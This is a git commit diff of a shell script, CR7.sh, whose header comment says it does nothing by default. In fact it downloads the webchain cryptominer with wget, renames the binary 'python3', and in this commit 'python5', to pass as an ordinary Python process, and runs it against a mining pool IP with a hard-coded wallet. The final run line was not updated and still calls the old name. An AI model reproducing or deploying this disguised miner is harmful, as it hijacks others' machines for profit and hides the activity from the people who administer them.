6493db93236c9f4d84fcb5e5f7c59e73a86ec11b
haidanglx <40859600+haidanglx@users.noreply.github.com>
2019-04-09 09:52:55 +0700

    Update CR7.sh

--- CR7.sh
+++ CR7.sh
@@ -10,15 +10,15 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python3 ]; then
-    if pgrep -x "python3" > /dev/null
+if [ -f ${PWD}/python5 ]; then
+    if pgrep -x "python5" > /dev/null
 then
     echo "Miner dang chay roi , ke cmn di "
     
 else
 
 echo "Miner da install , chay thoi "
-./python3 -o 42.119.159.78:4123 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
+./python5 -o 42.119.159.78:4123 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
      
 fi
@@ -28,7 +28,7 @@ fi
 
 wget https://github.com/webchain-network/webchain-miner/releases/download/v2.6.2.0/webchain-miner-2.6.2.0-linux-amd64.tar.gz
 tar xvzf webchain-miner-2.6.2.0-linux-amd64.tar.gz
-mv webchain-miner python3
+mv webchain-miner python5
 rm config.json
 ./python3 -o 42.119.159.78:4123 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x
 
